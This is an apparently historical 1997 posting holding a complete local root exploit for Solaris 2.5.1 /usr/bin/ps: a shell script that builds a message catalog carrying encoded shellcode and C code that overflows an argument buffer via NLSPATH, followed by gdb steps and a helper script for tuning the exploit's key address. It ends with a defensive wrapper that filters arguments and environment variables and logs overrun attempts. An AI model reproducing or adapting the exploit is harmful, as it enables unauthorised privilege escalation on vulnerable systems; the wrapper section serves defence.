
                    #!/bin/sh
                    #
                    # Exploit for Solaris 2.5.1 /usr/bin/ps
                    # J. Zbiciak, 5/18/97
                    #

                    # change as appropriate
                    CC=gcc

                    # Build the "replacement message" :-)
                    cat > ps_expl.po << E_O_F
                    domain "SUNW_OST_OSCMD"
                    msgid "usage: %s\n%s\n%s\n%s\n%s\n%s\n%s\n"
                    msgstr "\055\013\330\232\254\025\241\156\057\013\332\334\256\025\343\150\220\013\200\016\222\003\240\014\224\032\200\012\234\003\240\024\354\073\277\354\300\043\277\364\334\043\277\370\300\043\277\374\202\020\040\073\221\320\040\010\220\033\300\017\202\020\040\001\221\320\040\010"
                    E_O_F

                    msgfmt -o /tmp/foo ps_expl.po

                    # Build the C portion of the exploit
                    cat > ps_expl.c << E_O_F

                    /*****************************************/
                    /* Exploit for Solaris 2.5.1 /usr/bin/ps */
                    /* J. Zbiciak,  5/18/97                  */
                    /*****************************************/
                    #include <stdio.h>
                    #include <stdlib.h>
                    #include <sys/types.h>
                    #include <unistd.h>

                    #define BUF_LENGTH      (632)
                    #define EXTRA           (256)

                    int main(int argc, char *argv[])
                    {
                            char buf[BUF_LENGTH + EXTRA];
                                          /* ps will grok this file for the exploit code */
                            char *envp[]={"NLSPATH=/tmp/foo",0};
                            u_long *long_p;
                            u_char *char_p;
                                            /* This will vary depending on your libc */
                            u_long proc_link=0xef70ef70;
                            int i;

                            long_p = (u_long *) buf;

                            /* This first loop smashes the target buffer for optargs */
                            for (i = 0; i < (96) / sizeof(u_long); i++)
                                    *long_p++ = 0x10101010;

                            /* At offset 96 is the environ ptr -- be careful not to mess it up */
                            *long_p++=0xeffffcb0;
                            *long_p++=0xffffffff;

                            /* After that is the _ctype table.  Filling with 0x10101010 marks the
                               entire character set as being "uppercase printable". */
                            for (i = 0; i < (BUF_LENGTH-104) / sizeof(u_long); i++)
                                    *long_p++ = 0x10101010;

                            /* build up _iob[0]  (Ref: /usr/include/stdio.h, struct FILE) */
                            *long_p++ = 0xFFFFFFFF;   /* num chars in buffer */
                            *long_p++ = proc_link;    /* pointer to chars in buffer */
                            *long_p++ = proc_link;    /* pointer to buffer */
                            *long_p++ = 0x0501FFFF;   /* unbuffered output on stream 1 */
                            /* Note: "stdin" is marked as an output stream.  Don't sweat it. :-) */

                            /* build up _iob[1] */
                            *long_p++ = 0xFFFFFFFF;   /* num chars in buffer */
                            *long_p++ = proc_link;    /* pointer to chars in buffer */
                            *long_p++ = proc_link;    /* pointer to buffer */
                            *long_p++ = 0x4201FFFF;   /* line-buffered output on stream 1 */

                            /* build up _iob[2] */
                            *long_p++ = 0xFFFFFFFF;   /* num chars in buffer */
                            *long_p++ = proc_link;    /* pointer to chars in buffer */
                            *long_p++ = proc_link;    /* pointer to buffer */
                            *long_p++ = 0x4202FFFF;   /* line-buffered output on stream 2 */

                            *long_p =0;

                            /* The following includes the invalid argument '-z' to force the
                               usage msg to appear after the arguments have been parsed. */
                            execle("/usr/bin/ps", "ps", "-z", "-u", buf, (char *) 0, envp);
                            perror("execle failed");

                            return 0;
                    }
                    E_O_F

                    # Compile it
                    $CC -o ps_expl ps_expl.c

                    # And off we go!
                    exec ./ps_expl







                    ===========================================================================




                    A number of you have written saying that the exploit doesn't work.
                    The biggest problem is that the exploit relies on a very specific
                    address (which I put in the proc_link variable) in order to work.

                    (Incidentally, as some have noted, there was a stray '*' in one of
                    the versions I sent out which causes some warnings to be generated.
                    Change "u_long *proc_link=..." to "u_long proc_link=..." if this
                    bothers you.  The warnings are benign in this case.)

                    The following shortcut seems to work for finding the value for
                    the bothersome proc_link variable.  You don't need to be a gdb whiz
                    to do this:

                    $ gdb ./ps
                    GDB is free software and you are welcome to distribute copies of it
                     under certain conditions; type "show copying" to see the conditions.
                    There is absolutely no warranty for GDB; type "show warranty" for details.
                    GDB 4.16 (sparc-sun-solaris2.4),
                    Copyright 1996 Free Software Foundation, Inc...(no debugging symbols found)...
                    (gdb) break exit
                    Breakpoint 1 at 0x25244
                    (gdb) run
                    Starting program: /home3/student/im14u2c/c/./ps
                    (no debugging symbols found)...(no debugging symbols found)...
                    (no debugging symbols found)...Breakpoint 1 at 0xef7545c0
                    (no debugging symbols found)...   PID TTY      TIME CMD
                      9840 pts/27   0:01 ps
                     19499 pts/27   0:10 bash
                      9830 pts/27   0:02 gdb

                    Breakpoint 1, 0xef7545c0 in exit ()
                    (gdb) disassemble exit
                    Dump of assembler code for function exit:
                    0xef7545c0 <exit>:      call  0xef771408 <_PROCEDURE_LINKAGE_TABLE_+7188>
                    0xef7545c4 <exit+4>:    nop
                    0xef7545c8 <exit+8>:    mov  1, %g1
                    0xef7545cc <exit+12>:   ta  8
                    End of assembler dump.
                    (gdb)

                    The magic number is in the "call" above: 0xef771408.

                    For the extremely lazy, the following shell script worked for me to
                    extract this value from the noise.  Your Mileage May Vary.

                    --- extract_proc_link.sh
                    #!/bin/sh

                    cp /usr/bin/ps ./ps
                    FOO="`cat << E_O_F | gdb ./ps | grep PROC | cut -d: -f2 | cut -d\< -f1
                    break exit
                    run
                    disassemble exit
                    quit
                    y
                    E_O_F
                    `"

                    rm -f ./ps

                    set $FOO foo

                    [ -f "$1" = "foo" ] && echo "Try something else" && exit 1;

                    echo "  u_long proc_link=$2;"
                    --- EOF

                    Note, this sets the proc_link variable to the routine "exit" calls, so
                    you will probably get garbage on your screen when the exploit runs.
                    Solution: To it from an xterm or something which lets you do a "reset"
                    to nullify the action of the control characters in the exploit.

                    Incidentally, it appears that /usr/ucb/ps is equally succeptable to this
                    hole, except the vulnerability is on the -t argument, and the string
                    grokked by gettext is different, so the "ps_expl.po" file needs to be
                    changed slightly.  Fortunately, "environ" and "proc_link" are pretty
                    much the same.  (Use the "extract" script above on /usr/ucb/ps, etc.)



                    ============================================================================




                    Here's a generic wrapper I've written that you can use as an interim
                    solution for wrapping /usr/bin/ps and /usr/ucb/ps.  (/usr/ucb/ps looks
                    to be similarly vulnerable.)  The code is fairly well documented IMHO,
                    and should be adaptable enough to wrap just about any program.

                    This wrapper also filters environment variables, so if you have binaries
                    which blindly trust certain variables (NLSPATH is a common one in Solaris),
                    you can filter out those variables.  (You could also fairly trivially
                    add in default values for some variables if you needed to, such as for
                    NLSPATH.)

                    Finally, this wrapper will log exploit attempts to syslog if you configure
                    that option.  The log facility, log priority, and log ident are all
                    configurable with #defines.  I've currently set the code to LOG_ALERT
                    on LOG_LOCAL0, with ident "wrapper".  To prevent problems with syslog,
                    the wrapper even limits the number of characters it writes per log
                    message.  (Note:  This limit is on the number of characters per message,
                    not including the identifier, PID, etc.)

                    I make no guarantee or warranty about this code; it looks good/works fine
                    for me.  :-)   If you have problems configuring this wrapper for a
                    particular program, first read all the comments in the source, and then
                    email me if you still can't figure it out.  :-)

                    Incidentally, it's safe to leave ps lying around without the suid-bit;
                    it'll happily list the calling user's own processes, and those processes
                    alone.  That's one of the wonderful advantages of a /proc based ps.  :-)

                    --- wrapper.c

                    /*****************************************************************/
                    /* Generic wrapper to prevent exploitation of suid/sgid programs */
                    /* J. Zbiciak, 5/19/97                                           */
                    /*****************************************************************/

                    #include <stdio.h>
                    #include <syslog.h>
                    #include <strings.h>
                    #include <unistd.h>
                    #include <errno.h>

                    static char rcsid[]="$Id: wrapper.c,v 1.1 1997/05/19 22:48:03 jzbiciak Exp $";

                    /**************************************************************************/
                    /* To install, move wrapped executable to a different file name.  (I like */
                    /* just appending an underscore '_' to the filename.)  Then, remove the   */
                    /* offending permission bit.  Finally, place this program in the wrapped  */
                    /* program's place with the appropriate permissions.   Enjoy!             */
                    /**************************************************************************/

                    /* Tunable values per program being wrapped                               */
                    #define WRAPPED "/usr/bin/ps"   /* Set to full path of wrapped executable */
                    #define REALBIN WRAPPED"_"      /* Usually can be left untouched.         */
                    #define MAX_ARG (32)            /* Maximum argv parameter length.         */
                    #define SYSLOG 1                /* Enable/disable SYSLOGging              */
                    #define FACILITY LOG_LOCAL0     /* Facility to syslog() to                */
                    #define PRIORITY LOG_ALERT      /* Priority level for syslog()            */
                    #define LOGIDENT "wrapper"      /* How to identify myself to syslog()     */

                    typedef struct tEnvInfo
                    {
                            char * env;             /* Environment var name with trailing '=' */
                            int name_len;           /* Length of name (including '=')         */
                            int max_len;            /* Max length of value assignable to var  */
                    } TEnvInfo;

                    /* aside:  trailing '=' is necessary to prevent problems with variables   */
                    /*         whose names prefix each other.                                 */

                    TEnvInfo allowed_env [] =       /* Environ. vars we allow program to see  */
                    {
                            { "COLUMNS=",           8,      4  },
                            { "LC_CTYPE=",          9,      64 },
                            { "LC_MESSAGES=",       11,     64 },
                            { "LC_TIME=",           8,      64 },
                            { "LOGNAME=",           8,      16 },
                            { "TERM=",              5,      16 },
                            { "USER=",              5,      16 },
                    };
                    #define NUM_ALLOWED_ENV (sizeof(allowed_env)/sizeof(TEnvInfo))

                    /* Internal use only -- shouldn't need to adjust, usually                */
                    #define MSG_LEN (192)          /* Maximum output message length.         */
                    #define MAX_LOG (64)           /* Maximum length per call to syslog()    */

                    #ifndef SYSLOG
                    #error Define "SYSLOG" to be either 1 or 0 explicitly
                    #endif

                    /* No user serviceable parts inside (End of configurable options)        */

                    /* Log a message to syslog, and abort */
                    void log(char * s)
                    {
                    #if SYSLOG
                        char buf[MAX_LOG];
                        int l;

                        l=strlen(s);

                        /* Open up syslog; use "Local0" facility */
                        openlog(LOGIDENT "[" WRAPPED "]",LOG_PID,FACILITY);

                        do {
                            strncpy(buf,s,MAX_LOG-1);
                            buf[MAX_LOG-1]=0;
                            syslog (PRIORITY,buf);
                            l-=64;
                            if (l>0) s+=MAX_LOG-1;
                        } while (l>0);

                        closelog();
                    #endif

                        exit(1);
                    }

                    /* The main event */
                    int main(int argc, char * argv[], char *envp[])
                    {
                        int i,j,k;
                        char buf[MSG_LEN];

                        /* Check all of argv.  Log and exit if any args have length > MAX_ARG */
                        for (i=0;i<argc && argv[i]!=0;i++)
                        {
                            if (strlen(argv[i])>MAX_ARG)
                            {
                                printf("Error: Aborting!\n"
                                       " Excessive commandline argument length: '%s'\n", argv[i]);
                                /* Safe since uid/gid etc. are max 5 chars apiece */
                                sprintf(buf,
                                    "Attempted overrun (argv): "
                                    "uid=%.5d gid=%.5d euid=%.5d egid=%.5d\n",
                                    (int)getuid(),(int)getgid(),(int)geteuid(),(int)getegid());
                                log(buf);
                                exit(1);  /* safety net */
                            }
                        }

                        /* Check all of envp.  Throw out any environment variables which
                           aren't in "allowed_env[]".  If any variables permitted by
                           "allowed_env[]" are too long, log and exit. */

                        for (i=j=0; envp[i]!=0; i++)
                        {
                            for (k=0;k<NUM_ALLOWED_ENV;k++)
                            {
                                if (strncmp(envp[i],
                                            allowed_env[k].env,
                                            allowed_env[k].name_len)==0)
                                    break;
                            }
                            if (k!=NUM_ALLOWED_ENV)
                            {
                                if (strlen(envp[i]) >
                                    allowed_env[k].max_len+allowed_env[k].name_len)
                                {
                                    printf("Error: Aborting!\n"
                                            " Excessive environment variable length: '%s'\n",
                                            envp[i]);
                                    /* Safe because we have control over allowed_env[] */
                                    sprintf(buf,
                                        "Attempted overrun (env var '%s'): "
                                        "uid=%.5d gid=%.5d euid=%.5d egid=%.5d\n",
                                        allowed_env[k].env,
                                        (int)getuid(),(int)getgid(),(int)geteuid(),(int)getegid());
                                    log(buf);
                                    exit(1);  /* safety net */
                                }
                                envp[j++]=envp[i];
                            }
                            if (j>NUM_ALLOWED_ENV)
                            {
                                log("Internal error to wrapper -- too many allowed env vars");
                                exit(1);  /* safety net */
                            }
                        }
                        envp[j]=0;

                        /* If we make it this far, we're good to go. */
                        argv[0]=WRAPPED;
                        execve(REALBIN, argv, envp);

                        /* Safe, because errno number is very few chars */
                        sprintf(buf, "execve failed!  errno=%.5d\n",errno);
                        perror("execve() failed");
                        log(buf);

                        exit(1); /* safety net */

                    }

                    --- EOF